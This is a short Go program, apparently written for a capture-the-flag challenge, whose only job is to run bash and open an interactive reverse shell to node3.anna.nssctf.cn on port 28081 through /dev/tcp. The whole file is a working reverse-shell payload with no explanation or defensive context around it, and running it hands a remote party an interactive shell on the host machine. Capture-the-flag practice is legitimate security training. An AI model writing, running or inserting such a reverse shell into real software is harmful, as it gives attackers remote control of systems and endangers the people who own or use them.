package main

import (
	"fmt"
	"os/exec"
)

func main() {
	cmd := exec.Command("bash", "-c", "bash -i  >& /dev/tcp/node3.anna.nssctf.cn/28081 0>&1 ")

	// cmd.Stdout = os.Stdout
	// cmd.Stderr = os.Stderr

	e := cmd.Run()
	CheckError(e)

}

func CheckError(e error) {
	if e != nil {
		fmt.Println(e)
	}
}
